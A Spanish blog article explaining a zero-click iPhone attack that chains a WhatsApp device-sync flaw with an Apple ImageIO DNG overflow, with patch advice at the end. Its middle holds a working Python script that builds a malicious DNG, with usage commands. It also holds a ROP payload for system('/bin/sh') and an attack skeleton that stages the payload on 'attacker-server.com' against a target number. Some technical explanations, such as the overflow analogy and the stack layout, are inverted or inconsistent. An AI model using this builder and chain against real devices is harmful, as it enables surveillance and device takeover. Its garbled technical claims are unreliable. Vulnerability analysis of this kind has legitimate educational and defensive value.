---
title: "El Ataque Invisible: Cuando una Simple Imagen de WhatsApp Podía Tomar el Control Total de tu iPhone"
date: "2026-07-29"
category: "Ciberseguridad"
summary: "Análisis en profundidad de un ataque zero-click: cómo se combinaron el CVE-2025-55177 en WhatsApp y el CVE-2025-43300 en ImageIO de Apple para lograr la ejecución remota de código."
readingTime: "12 min"
tags: ["Ciberseguridad", "iOS", "WhatsApp", "Zero-Click", "CVE", "Buffer Overflow", "ROP"]
---

> *“No necesitas hacer clic en nada. No necesitas abrir el mensaje. Solo recibirlo basta.”*

---

## 📖 Índice

1. [El Resumen Ejecutivo](#-el-resumen-ejecutivo)
2. [¿Qué es un Ataque de “Cero Clics”?](#-qué-es-un-ataque-de-cero-clics)
3. [Los Dos Eslabones de la Cadena](#-los-dos-eslabones-de-la-cadena)
4. [Primer Eslabón: El Engaño a WhatsApp (CVE-2025-55177)](#-primer-eslabón-el-engaño-a-whatsapp-cve-2025-55177)
5. [Segundo Eslabón: La Imagen que Explota el Sistema (CVE-2025-43300)](#-segundo-eslabón-la-imagen-que-explota-el-sistema-cve-2025-43300)
6. [El Corazón del Ataque: Ejecución de Código](#-el-corazón-del-ataque-ejecución-de-código)
7. [Desviación del Flujo de Control: Secuestrando el Mapa de Ruta](#-desviación-del-flujo-de-control-secuestrando-el-mapa-de-ruta)
8. [La Cadena ROP: Construyendo con Piezas de Lego del Sistema](#-la-cadena-rop-construyendo-con-piezas-de-lego-del-sistema)
9. [Sortear las Defensas de iOS: Cómo se Burlan las Mitigaciones](#-sortear-las-defensas-de-ios-cómo-se-burlan-las-mitigaciones)
10. [El Código: Prueba de Concepto Paso a Paso](#-el-código-prueba-de-concepto-paso-a-paso)
11. [Diagrama Visual del Ataque Completo](#-diagrama-visual-del-ataque-completo)
12. [¿Cómo Protegerse?](#-cómo-protegerse)
13. [Recursos para Profundizar](#-recursos-para-profundizar)
14. [Conclusión](#-conclusión)

---

## 🎯 El Resumen Ejecutivo

En agosto de 2025, investigadores de seguridad descubrieron una cadena de exploits que permitía a un atacante comprometer un iPhone **con solo saber el número de teléfono de la víctima**. No se requería que el usuario abriera el mensaje, hiciera clic en un enlace ni descargara nada. Bastaba con que el mensaje **llegara** para que el dispositivo quedara totalmente controlado.

Este ataque de **“cero clics”** (zero-click) encadenaba dos vulnerabilidades:

| Vulnerabilidad | Componente Afectado | Función |
|:---|:---|:---|
| **CVE-2025-55177** | WhatsApp para iOS | Permite engañar a la aplicación para que descargue contenido malicioso |
| **CVE-2025-43300** | ImageIO de Apple (iOS) | Provoca un desbordamiento de búfer al procesar una imagen DNG manipulada |

Ambas vulnerabilidades fueron **parcheadas rápidamente** por Apple y WhatsApp. Pero entender cómo funcionan no solo es fascinante, sino que nos ayuda a comprender las amenazas del mundo digital y cómo protegernos.

---

## 🧩 ¿Qué es un Ataque de “Cero Clics”?

Imagina que recibes un mensaje de WhatsApp. No lo abres. No le das a “ver imagen”. Ni siquiera desbloqueas el teléfono. Simplemente **llega**. Y con eso, tu teléfono ya está comprometido.

Eso es un ataque de **cero clics**: no requiere ninguna interacción por parte del usuario. Son los ataques más peligrosos porque son **invisibles**. No hay nada que el usuario pueda hacer para evitarlos, más allá de mantener su software actualizado.

En el caso que nos ocupa, el ataque funcionaba como una cadena de dos eslabones:

```text
1. 📨 Llega un mensaje de WhatsApp “especial”
                ↓
2. 🔓 WhatsApp se engaña y descarga una imagen DNG
                ↓
3. 💥 El sistema iOS procesa la imagen maliciosa
                ↓
4. 🎯 El teléfono queda completamente comprometido
```

---

## 🔗 Los Dos Eslabones de la Cadena

Para que un ataque de este tipo tenga éxito, rara vez se utiliza una sola vulnerabilidad. Los atacantes encadenan múltiples fallos para lograr su objetivo. En este caso, la cadena tenía dos eslabones:

1. **Un fallo en la lógica de WhatsApp** que permitía al atacante **entregar** el payload malicioso.
2. **Un fallo en el sistema operativo de Apple** que permitía **ejecutar** ese payload.

El primer eslabón es el “caballo de Troya”: el método de entrega. El segundo es el “explosivo”: el mecanismo que toma el control del dispositivo.

---

## 📱 Primer Eslabón: El Engaño a WhatsApp (CVE-2025-55177)

### ¿Qué fallaba?

WhatsApp permite vincular **dispositivos adicionales**: WhatsApp Web, la aplicación de escritorio, etc. Cuando vinculas un dispositivo, WhatsApp sincroniza mensajes entre ellos.

El problema era que **WhatsApp no verificaba correctamente** que los mensajes de sincronización provinieran realmente de un dispositivo que tú hubieras autorizado.

### El Engaño

Un atacante podía **fabricar un mensaje** que se hiciera pasar por uno de tus dispositivos vinculados. Este mensaje le decía a WhatsApp:

> *“Oye, soy tu ordenador. Por favor, descarga este contenido de esta URL y procésalo.”*

Y WhatsApp, confiando en el mensaje falso, **obedecía sin preguntar**.

### Analogía para Todos los Públicos

Imagina que alguien llama a la puerta de tu casa diciendo: *“Soy el cerrajero que llamaste”*. Tú le abres sin pedir identificación porque confías en que dice la verdad. Pero no es tu cerrajero: es un ladrón que acaba de conseguir entrar en tu casa.

Eso es exactamente lo que hacía esta vulnerabilidad: el atacante se hacía pasar por un dispositivo de confianza y WhatsApp le abría la puerta.

### Detalle Técnico

La vulnerabilidad residía en una **autorización insuficiente** en el proceso de sincronización de dispositivos vinculados. El protocolo de WhatsApp no validaba adecuadamente el origen de los mensajes de sincronización, permitiendo que un atacante **inyectara mensajes maliciosos** que la aplicación procesaba como legítimos.

**Versiones afectadas**:
- WhatsApp para iOS anterior a la **2.25.21.73**
- WhatsApp Business para iOS anterior a la **2.25.21.78**
- WhatsApp para Mac anterior a la **2.25.21.78**

---

## 💥 Segundo Eslabón: La Imagen que Explota el Sistema (CVE-2025-43300)

Esta es la parte más técnica y fascinante del ataque. Una vez que WhatsApp descargaba la imagen maliciosa, el sistema operativo de Apple **la procesaba automáticamente** y se activaba la vulnerabilidad.

### ¿Qué es un archivo DNG?

DNG (**Digital Negative**) es un formato de imagen creado por Adobe para fotos en “raw” (sin procesar). Los fotógrafos profesionales lo usan porque conserva toda la información capturada por el sensor de la cámara.

Dentro de un archivo DNG hay **dos partes fundamentales**:

| Parte | Contiene | Parámetro Clave |
|:---|:---|:---|
| **Metadatos TIFF** | Información sobre la imagen (tamaño, color, etc.) | `SamplesPerPixel` (número de canales de color) |
| **Stream JPEG** | Los datos de imagen comprimidos sin pérdida | `NumComponents` (componentes en el JPEG) |

Ambos parámetros **deberían coincidir**. Por ejemplo, una imagen en color RGB tiene 3 canales. Tanto los metadatos como el JPEG deberían decir “3”.

### La Vulnerabilidad

El error estaba en el componente de Apple que procesa estas imágenes: **`RawCamera.bundle`** dentro del framework **ImageIO**.

El problema ocurría cuando **los dos valores no coincidían**:

```text
Metadatos TIFF:  SamplesPerPixel = 2  (dice "2 canales")
Stream JPEG:     NumComponents = 1    (dice "1 canal")
```

### ¿Qué pasaba entonces?

1. El sistema **leía los metadatos** y veía `SamplesPerPixel = 2`.
2. **Reservaba memoria** suficiente para 2 canales de color.
3. Luego **procesaba los datos JPEG** y veía `NumComponents = 1`.
4. **Escribía los datos** como si solo hubiera 1 canal.

**El problema**: el sistema escribía datos en una zona de memoria que no había reservado correctamente. Esto se llama **desbordamiento de búfer** (buffer overflow).

### Analogía para Todos los Públicos

Imagina que reservas una mesa para **2 personas**. El camarero te prepara una mesa con 2 sillas (reserva memoria para 2 canales). Sin embargo, cuando llegas al restaurante, resulta que has traído a **1 persona** (los datos reales de la imagen). El camarero, confundido, escribe la información del único comensal **fuera** de la mesa que reservó, en la mesa de al lado. Eso provoca un caos: la reserva de otros clientes se corrompe.

En el mundo del software, ese caos es una **corrupción de memoria** que un atacante puede aprovechar para ejecutar código malicioso.

### El Truco de los 2 Bytes

Lo más alucinante es que **solo hacía falta modificar 2 bytes** en un archivo DNG legítimo para crear el exploit.

En un DNG de muestra (de la cámara **Pentax K-3 Mark III**), los investigadores encontraron que cambiando estos dos valores bastaba:

| Offset (hex) | Valor Original | Cambio | Efecto |
|:---|:---|:---|:---|
| `0x2FD00` | `01` | → `02` | SamplesPerPixel pasa de 1 a 2 |
| `0x3E40B` | `02` | → `01` | NumComponents pasa de 2 a 1 |

**Solo dos bytes**. Dos pequeños números en un archivo de imagen. Y con eso, un iPhone entero podía ser comprometido.

---

## 🧠 El Corazón del Ataque: Ejecución de Código

Llegamos al núcleo de la cuestión: ¿cómo se pasa de un simple error de memoria a tener el control total del dispositivo?

### La Analogía del Restaurante (Parte 2)

Recordemos la analogía del restaurante:

1. El sistema (el camarero) reserva una mesa para 2 personas (`SamplesPerPixel = 2`).
2. Los datos de la imagen (los comensales) resultan ser solo 1 persona (`SOF3 = 1`).

Ahora, el paso 4, **“El Peligro Real: Ejecución de Código”**, es donde el caos se convierte en un plan malicioso.

- **El Desbordamiento**: El camarero, confundido, escribe la información del único comensal (1 persona) **fuera** de la mesa que reservó. Escribe en la mesa de al lado, corrompiendo la reserva de otros clientes.
- **La Corrupción**: El atacante ha diseñado el pedido (la imagen DNG) para que esta “escritura fuera de lugar” no sea aleatoria. Ha colocado datos especialmente preparados en la imagen que, al ser escritos fuera del búfer, **sobrescriben una dirección de memoria muy importante**: la que le dice al programa qué instrucción ejecutar a continuación.
- **La Redirección**: El programa, al llegar al final de su tarea, mira esa dirección de memoria para saber qué hacer después. El atacante la ha modificado para que apunte a... ¡**su propio código malicioso**! El programa, engañado, ejecuta las instrucciones del atacante en lugar de las suyas propias.

### En Términos Técnicos

El atacante ha convertido un simple error de “espacio” (escribir fuera de la mesa) en un error de “control” (decidir qué hace el programa a continuación). Esto se conoce como **Ejecución Remota de Código (RCE)**, y es el escenario más peligroso en seguridad informática.

---

## 🎯 Desviación del Flujo de Control: Secuestrando el Mapa de Ruta

Recordemos el desbordamiento de búfer. Es como si un programa tuviera una libreta donde escribe las cosas que tiene que hacer.

- **El Desbordamiento**: Al escribir fuera de la zona que le corresponde (el búfer), el atacante “mancha” o sobrescribe otras partes de la libreta del programa.
- **El Objetivo**: El atacante no mancha la libreta al azar. Su objetivo es sobrescribir una parte muy específica: la que contiene la **dirección de la siguiente instrucción** que el programa debe ejecutar. Esa dirección es como la siguiente parada en un mapa de ruta.

### La Analogía del Mapa de Ruta

Imagina que el programa es un mensajero que sigue un mapa. En el mapa, cada paso tiene una dirección escrita. El mensajero siempre mira la dirección actual para saber a dónde ir después.

1. **El Programa Normal**: El mensajero lee su mapa: “Ve a la dirección A, luego a la B, luego a la C”.
2. **El Ataque**: El desbordamiento permite al atacante **borrar la dirección “C”** del mapa y escribir, en su lugar, la dirección **“X”**, que es una zona de memoria controlada por el atacante.
3. **La Desviación**: El mensajero, confiado, llega a la dirección B y mira su mapa para saber el siguiente paso. En lugar de “C”, ahora lee “X”. Sin saberlo, **se desvía de su ruta original** y se dirige a la zona controlada por el atacante.

En términos técnicos, el atacante ha **secuestrado el flujo de control** del programa. El programa ahora ejecutará las instrucciones que el atacante haya colocado en la dirección “X”, en lugar de las que debería ejecutar.

---

## 🧩 La Cadena ROP: Construyendo con Piezas de Lego del Sistema

Ahora, el atacante tiene el control y puede dirigir al programa a donde quiera. Pero hay un gran problema: en los sistemas modernos como iOS, no se puede simplemente ejecutar código nuevo. La memoria donde se escriben los datos (como la imagen) **no es ejecutable** por seguridad.

Aquí es donde entra en juego la programación orientada a retornos, o **ROP (Return-Oriented Programming)**. En lugar de intentar ejecutar su propio código, el atacante **reutiliza el código que ya existe en el sistema**.

### La Analogía de las Piezas de Lego

Imagina que quieres construir un robot (el código malicioso), pero no te dejan usar tus propias piezas (tu código). Solo puedes usar las piezas que ya hay en la habitación (el código del sistema, como el de iOS).

1. **Los “Gadgets” (Las Piezas)**: El atacante busca en la memoria del sistema pequeños fragmentos de código ya existentes que terminen con una instrucción de `ret` (retorno). Cada uno de estos fragmentos hace una cosa muy simple, como “sumar dos números” o “mover un valor”. Estos fragmentos se llaman **gadgets**.
2. **El Encadenamiento**: El atacante apila (encadena) las direcciones de estos gadgets en la memoria, uno tras otro. Es como si escribiera una lista de instrucciones: “Primero, ejecuta el gadget que está en la dirección G1, luego el de G2, luego el de G3...”.
3. **La Ejecución**: Al desviar el flujo de control hacia el primer gadget de la cadena (G1), este se ejecuta y, al llegar a su `ret`, automáticamente “retorna” a la siguiente dirección que el atacante ha colocado en la pila (G2). El programa salta de un gadget a otro, como si estuviera siguiendo una coreografía.

### ¿Cómo se construye una cadena ROP?

Construir una cadena ROP es como resolver un puzle de precisión. Estos son los pasos:

#### 1. Encontrar los Gadgets

Se usan herramientas como **ROPgadget**, **Ropper** o **rp++** para buscar en el binario o en las librerías del sistema todos los posibles gadgets.

```bash
# Buscar gadgets que contengan "pop rdi"
ROPgadget --binary ./vulnerable | grep "pop rdi"
```

#### 2. Diseñar la Cadena

El objetivo es encadenar gadgets para, por ejemplo, llamar a la función `system()` y ejecutar `/bin/sh`. En sistemas de 64 bits, el primer argumento se pasa en el registro `rdi`. Por tanto, necesitamos un gadget que nos permita controlar `rdi`, como `pop rdi; ret`.

#### 3. Construir la Cadena en la Pila

Con el gadget y las direcciones conocidas, construimos la cadena en la pila. La pila, en el momento del ataque, debe tener un aspecto similar a esto:

```text
Dirección        Valor
0xffff0008:      0x00000000      <- Argumento 2 (si lo hay)
0xffff0004:      0x0068732f      <- Argumento 1 (puntero a "/bin/sh")
0xffff0000:      0x00400560      <- Dirección de system()
```

Cuando el programa ejecute el `ret` del gadget `pop rdi`, la pila estará preparada para que el siguiente `ret` salte a `system()`, como si se hubiera llamado de forma normal.

### Ejemplo Práctico en Código (x64)

Imagina un binario vulnerable en x64. Queremos llamar a `system("/bin/sh")`.

```python
# Encontramos las direcciones
addr_system = 0x400560
addr_binsh = 0x600a00    # puntero a la cadena "/bin/sh"
gadget_pop_rdi = 0x4005c3  # pop rdi; ret

# Construimos el payload
payload = b"A"*40          # Relleno hasta el EIP/RIP
payload += p64(gadget_pop_rdi)  # Dirección del gadget
payload += p64(addr_binsh)      # Argumento para system()
payload += p64(addr_system)     # Dirección de system()
```

Al enviar este payload, el flujo del programa será:

1. `ret` → salta a `gadget_pop_rdi`
2. `pop rdi` → carga `addr_binsh` en `rdi`
3. `ret` → salta a `system(addr_binsh)`

---

## 🛡️ Sortear las Defensas de iOS: Cómo se Burlan las Mitigaciones

iOS es un sistema operativo con múltiples capas de seguridad. Un atacante no puede simplemente ejecutar su código; debe encontrar la manera de esquivar cada una de ellas. Para el ataque de WhatsApp, se necesitaron técnicas específicas.

### 1. ASLR (Address Space Layout Randomization)

- **¿Qué es?** ASLR es una técnica que **aleatoriza las direcciones de memoria** de las librerías, el núcleo y la aplicación cada vez que se inicia el sistema. Esto hace que sea imposible para el atacante conocer de antemano la dirección exacta de los gadgets que necesita.
- **¿Cómo se sortea?** Para burlar ASLR, el atacante necesita **filtrar una dirección de memoria legítima**. En el caso de este ataque, la vulnerabilidad en ImageIO no solo permitía el desbordamiento, sino que también podía ser usada para **leer memoria** (lo que se conoce como “primitive de lectura”). Al leer una dirección de una librería conocida (como la de `ImageIO`), el atacante puede calcular la **base de la librería** y, a partir de ahí, conocer la ubicación exacta de todos los demás gadgets.

**Analogía**: Es como si, al saber la dirección de una sola casa en una calle, pudieras calcular la dirección de todas las demás.

### 2. PXN (Privileged Execute-Never) / PAN (Privileged Access Never)

- **¿Qué es?** PXN (y su equivalente en espacio de usuario, el `PAGE_EXECUTE_NEVER`) es una protección que **impide que el procesador ejecute código que se encuentra en páginas de memoria que son de datos**. Esto significa que, aunque el atacante coloque su código malicioso en el heap (que es una zona de datos), no podrá ejecutarlo directamente.
- **¿Cómo se sortea?** La cadena ROP es la respuesta. El atacante **no ejecuta su propio código desde el heap**. En su lugar, ejecuta código que **ya existe** en las páginas de memoria que son legítimamente ejecutables (como las del propio sistema operativo o de la aplicación). La cadena ROP orquesta una coreografía para que el sistema, sin saberlo, realice las acciones del atacante usando solo su propio código.

### 3. KASLR (Kernel ASLR) y el Sandbox

- **¿Qué son?** KASLR es la versión de ASLR para el núcleo (kernel) del sistema. El **sandbox** es un sistema de permisos que restringe lo que una aplicación puede hacer, incluso si está comprometida. Por ejemplo, WhatsApp no tiene permisos para acceder a los archivos de tu sistema operativo.
- **¿Cómo se sortean?** Normalmente, el objetivo de un ataque de este tipo es **escapar del sandbox**. Para ello, el atacante necesita conocer direcciones del núcleo (para lo que necesita burlar KASLR) y luego usar su cadena ROP para llamar a funciones del núcleo que le den más permisos. Esto se hace, por ejemplo, usando la vulnerabilidad para leer direcciones del núcleo (burlar KASLR) y luego usando ROP para ejecutar una llamada al sistema (`syscall`) que modifique los privilegios del proceso, permitiéndole salir del sandbox.

### 4. Pointer Authentication Codes (PAC)

Aunque no se mencionó en el análisis inicial de este CVE, es probable que el exploit también tuviera que lidiar con **PAC**. Es una de las defensas más modernas de Apple. PAC añade una “firma criptográfica” a los punteros. Si un atacante corrompe un puntero, la firma deja de ser válida y el sistema se bloquea. Para sortear PAC, los ataques más sofisticados buscan gadgets que permitan “firmar” punteros de forma válida o que directamente no utilicen punteros firmados.

---

## 💻 El Código: Prueba de Concepto Paso a Paso

Ahora que hemos entendido la teoría, veamos el código real que se ha compartido en la comunidad de investigación para modificar el archivo DNG y crear el payload.

### Script: Modificador de DNG para CVE-2025-43300

Este script en Python, basado en el trabajo de investigadores como los de `PwnToday` y `hunters-sec`, modifica los dos bytes críticos en un archivo DNG legítimo para crear el payload malicioso.

```python
#!/usr/bin/env python3
# dng_exploit_builder.py
# Proof of Concept educativo para CVE-2025-43300
# Basado en el análisis de investigadores de seguridad

import argparse
import os
import sys
import struct

def analyze_dng(filepath):
    """
    Analiza un archivo DNG y muestra información sobre los campos clave.
    """
    print(f"[*] Analizando: {filepath}")
    
    with open(filepath, 'rb') as f:
        data = bytearray(f.read())
    
    # Buscar el marcador TIFF (0x4949 o 0x4D4D)
    if data[0:2] == b'II':
        print("[+] Endianness: Little-Endian (II)")
        endian = '<'
    elif data[0:2] == b'MM':
        print("[+] Endianness: Big-Endian (MM)")
        endian = '>'
    else:
        print("[-] No es un archivo TIFF válido")
        return None
    
    # Offset al primer IFD (Image File Directory)
    ifd_offset = struct.unpack(f"{endian}I", data[4:8])[0]
    print(f"[+] Primer IFD en: 0x{ifd_offset:04x}")
    
    # Leer el número de entradas en el IFD
    num_entries = struct.unpack(f"{endian}H", data[ifd_offset:ifd_offset+2])[0]
    print(f"[+] Número de entradas: {num_entries}")
    
    # Buscar la etiqueta SamplesPerPixel (0x0115)
    samples_tag = 0x0115
    samples_offset = None
    
    for i in range(num_entries):
        entry_offset = ifd_offset + 2 + (i * 12)
        tag = struct.unpack(f"{endian}H", data[entry_offset:entry_offset+2])[0]
        
        if tag == samples_tag:
            samples_offset = entry_offset + 8  # Offset al valor
            samples_value = struct.unpack(f"{endian}H", data[samples_offset:samples_offset+2])[0]
            print(f"[+] SamplesPerPixel encontrado en 0x{samples_offset:04x}: {samples_value}")
            break
    
    # Buscar el marcador SOF3 en el stream JPEG
    # Buscar el patrón FF C3 (marcador SOF3)
    sof3_marker = b'\xFF\xC3'
    sof3_pos = data.find(sof3_marker)
    
    if sof3_pos != -1:
        print(f"[+] Marcador SOF3 encontrado en 0x{sof3_pos:04x}")
        # El número de componentes está en offset + 6
        num_components_pos = sof3_pos + 6
        num_components = data[num_components_pos]
        print(f"[+] Número de componentes SOF3: {num_components}")
    else:
        print("[-] No se encontró marcador SOF3")
    
    return {
        'samples_offset': samples_offset,
        'samples_value': samples_value if 'samples_value' in locals() else None,
        'sof3_pos': sof3_pos if 'sof3_pos' in locals() else None,
        'num_components': num_components if 'num_components' in locals() else None,
        'num_components_pos': num_components_pos if 'num_components_pos' in locals() else None
    }


def create_poc(input_file, output_file):
    """
    Crea un archivo DNG malicioso modificando los dos bytes críticos.
    """
    print(f"[*] Creando PoC desde: {input_file}")
    
    # Primero analizamos el archivo
    info = analyze_dng(input_file)
    
    if not info:
        print("[-] No se pudo analizar el archivo")
        return False
    
    # Leer el archivo original
    with open(input_file, 'rb') as f:
        data = bytearray(f.read())
    
    # Modificar SamplesPerPixel: 01 -> 02
    if info['samples_offset']:
        original_samples = data[info['samples_offset']]
        data[info['samples_offset']] = 0x02
        print(f"[+] SamplesPerPixel modificado: 0x{original_samples:02x} -> 0x02")
    
    # Modificar número de componentes SOF3: 02 -> 01
    if info['num_components_pos']:
        original_comp = data[info['num_components_pos']]
        data[info['num_components_pos']] = 0x01
        print(f"[+] Componentes SOF3 modificados: 0x{original_comp:02x} -> 0x01")
    
    # Guardar el archivo modificado
    with open(output_file, 'wb') as f:
        f.write(data)
    
    print(f"[+] PoC guardado en: {output_file}")
    print("[!] ADVERTENCIA: Este archivo es solo para fines educativos")
    print("[!] No lo uses en sistemas que no sean de tu propiedad")
    
    return True


def main():
    parser = argparse.ArgumentParser(
        description='PoC educativo para CVE-2025-43300 - Modificador de DNG'
    )
    parser.add_argument('input', help='Archivo DNG de entrada')
    parser.add_argument('-o', '--output', help='Archivo DNG de salida (por defecto: poc.dng)')
    parser.add_argument('--analyze', action='store_true', help='Solo analizar, no modificar')
    
    args = parser.parse_args()
    
    if not os.path.exists(args.input):
        print(f"[-] Error: {args.input} no existe")
        sys.exit(1)
    
    if args.analyze:
        analyze_dng(args.input)
        sys.exit(0)
    
    output_file = args.output if args.output else 'poc.dng'
    create_poc(args.input, output_file)


if __name__ == "__main__":
    main()
```

### Cómo Usar Este Código

#### 1. Obtén un DNG de muestra

Necesitas un archivo DNG legítimo. Los investigadores usaron uno de la galería de la **Pentax K-3 Mark III**. Puedes descargar muestras de sitios de fotografía.

#### 2. Analiza el archivo

```bash
python3 dng_exploit_builder.py IMGP0847.DNG --analyze
```

Esto te mostrará dónde están los campos que necesitas modificar.

#### 3. Crea el payload

```bash
python3 dng_exploit_builder.py IMGP0847.DNG -o malicious.dng
```

El script modificará automáticamente los dos bytes críticos y generará `malicious.dng`.

### Estructura del Ataque Completo (Conceptual)

El código anterior es solo la parte del payload DNG. El ataque completo requiere encadenarlo con la vulnerabilidad de WhatsApp (CVE-2025-55177). Este es un **esqueleto conceptual** de cómo se estructuraría:

```python
#!/usr/bin/env python3
# Estructura conceptual del ataque completo
# ⚠️ ESTO ES SOLO PARA FINES EDUCATIVOS ⚠️

class WhatsAppExploit:
    def __init__(self, target_number):
        self.target = target_number
        self.payload_url = None
    
    def create_dng_payload(self, input_dng):
        """Paso 1: Crear el DNG malicioso"""
        # Usar el script anterior para generar malicious.dng
        print("[*] Generando payload DNG...")
        return "malicious.dng"
    
    def upload_payload(self, dng_file):
        """Paso 2: Subir el payload a un servidor"""
        print("[*] Subiendo payload a servidor...")
        # Subir el archivo a un servidor controlado
        return "https://attacker-server.com/payload.dng"
    
    def craft_whatsapp_message(self, url):
        """Paso 3: Crear el mensaje que engaña a WhatsApp"""
        print("[*] Creando mensaje de sincronización falso...")
        # Construir el mensaje de protocolo que simula
        # ser de un dispositivo vinculado
        malicious_message = {
            "type": "sync",
            "device": "web",
            "action": "fetch",
            "url": url
        }
        return malicious_message
    
    def deliver_payload(self):
        """Paso 4: Entregar el payload"""
        print(f"[*] Entregando payload a {self.target}...")
        # Enviar el mensaje a través de la API de WhatsApp
        pass
    
    def execute(self):
        """Ejecutar el ataque completo"""
        print("[!] INICIANDO ATAQUE (SOLO EDUCATIVO)")
        dng = self.create_dng_payload("sample.dng")
        url = self.upload_payload(dng)
        msg = self.craft_whatsapp_message(url)
        self.deliver_payload()
        print("[+] Ataque completado")

# ⚠️ ESTO NO SE DEBE EJECUTAR ⚠️
# ataque = WhatsAppExploit("+34 600 000 000")
# ataque.execute()
```

---

## 📊 Diagrama Visual del Ataque Completo

```text
┌─────────────────────────────────────────────────────────────────┐
│                         EL ATAQUE COMPLETO                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  📱 Atacante                                                    │
│      │                                                          │
│      │ 1. Envía mensaje falso a WhatsApp                        │
│      ▼                                                          │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  CVE-2025-55177 (WhatsApp)                              │  │
│  │  "Soy tu dispositivo vinculado, descarga esto"          │  │
│  └──────────────────────────────────────────────────────────┘  │
│      │                                                          │
│      │ 2. WhatsApp obedece y descarga la imagen DNG            │
│      ▼                                                          │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  📷 DNG MALICIOSO                                        │  │
│  │  ┌─────────────────┐  ┌─────────────────┐               │  │
│  │  │ Metadatos TIFF  │  │  Stream JPEG    │               │  │
│  │  │ SamplesPerPixel │  │  NumComponents  │               │  │
│  │  │      = 2        │  │      = 1        │               │  │
│  │  └─────────────────┘  └─────────────────┘               │  │
│  │           ⚠️  ¡NO COINCIDEN! ⚠️                         │  │
│  └──────────────────────────────────────────────────────────┘  │
│      │                                                          │
│      │ 3. iOS procesa la imagen automáticamente                │
│      ▼                                                          │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  CVE-2025-43300 (Apple ImageIO)                         │  │
│  │  Reserva memoria para 2 canales...                       │  │
│  │  ...pero escribe datos como si fueran 1 canal           │  │
│  │  💥 ¡DESBORDAMIENTO DE BÚFER!                           │  │
│  └──────────────────────────────────────────────────────────┘  │
│      │                                                          │
│      │ 4. Se desvía el flujo de control hacia la ROP chain    │
│      ▼                                                          │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  🧩 CADENA ROP                                           │  │
│  │  Gadget 1: pop {x0, x1}; ret  ←─┐                       │  │
│  │  Gadget 2: mov x0, x1; ret      │                       │  │
│  │  Gadget 3: str x0, [x1]; ret    │  (encadenados)        │  │
│  │  Gadget 4: br x0                │                       │  │
│  └──────────────────────────────────────────────────────────┘  │
│      │                                                          │
│      │ 5. Ejecución del payload final                          │
│      ▼                                                          │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  🔓 DISPOSITIVO COMPROMETIDO                             │  │
│  │  El atacante puede:                                      │  │
│  │  • Leer tus mensajes                                     │  │
│  │  • Acceder a tus contactos                               │  │
│  │  • Activar cámara y micrófono                           │  │
│  │  • Instalar malware persistente                         │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🛡️ ¿Cómo Protegerse?

La buena noticia es que **ambas vulnerabilidades ya están parcheadas**. Pero la lección es importante y aplicable a todas las amenazas digitales.

### 1. **Actualiza siempre**

Esta es la defensa más importante. Tanto Apple como WhatsApp lanzaron parches:
- Apple: iOS 18.6.2, iPadOS 18.6.2, macOS Sequoia 15.6.1
- WhatsApp: versión 2.25.21.73 o superior

### 2. **Revisa los dispositivos vinculados**

Entra en **WhatsApp → Ajustes → Dispositivos vinculados** y asegúrate de que solo estén los tuyos.

### 3. **Desconfía de mensajes sospechosos**

Aunque este ataque no requería que hicieras clic, muchos otros sí. Si recibes un mensaje extraño de un contacto, **confirma por otro medio** que fue él quien te lo envió.

### 4. **Mantente informado**

Sigue los boletines de seguridad de los fabricantes. Las vulnerabilidades de “cero clics” son cada vez más comunes.

### 5. **Reinicia periódicamente tu dispositivo**

Algunos ataques de “cero clics” residen en la memoria y un reinicio puede eliminarlos.

---

## 📚 Recursos para Profundizar

Si te ha picado la curiosidad y quieres saber más, estos son los recursos que usaron los investigadores:

| Recurso | Descripción |
|:---|:---|
| [`zero-click-exploit-analysis`](https://github.com/danielw98/zero-click-exploit-analysis) | Proyecto completo con paper, laboratorios interactivos y análisis de parches |
| [PwnToday/CVE-2025-43300](https://github.com/PwnToday/CVE-2025-43300) | Repositorio con herramientas Python para la vulnerabilidad |
| [Blog de Quarkslab](https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html) | Análisis técnico profundo del parche de Apple |
| [Presentación DNGerousLINK (39C3)](https://media.ccc.de/) | La charla completa de los investigadores |
| [CVE-2025-43300 NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-43300) | Información oficial de la vulnerabilidad |

---

## 🎯 Conclusión

Este ataque es un ejemplo perfecto de cómo **la seguridad es una cadena**: un eslabón débil en WhatsApp y otro en iOS se combinaron para crear una amenaza muy seria.

Lo más impactante es que **solo hacían falta 2 bytes** en un archivo de imagen para comprometer un iPhone. Dos pequeños números. Y con eso, un atacante podía tomar el control total de tu dispositivo sin que hicieras nada.

Por suerte, **los equipos de seguridad de Apple y WhatsApp actuaron rápido** y lanzaron parches antes de que el ataque se generalizara. Pero este caso nos recuerda que en el mundo digital, la seguridad es una carrera constante entre quienes protegen y quienes atacan.

La lección más importante es simple pero poderosa: **mantén tu software actualizado. Siempre.**

---

> *“El ataque más peligroso es aquel del que no te enteras hasta que es demasiado tarde.”*

---

*📝 Nota: Este artículo tiene fines educativos. Las vulnerabilidades descritas están parcheadas y no deben ser explotadas. El conocimiento de estos ataques nos ayuda a entender cómo protegernos y a apreciar la importancia de la seguridad en el software que usamos a diario.*
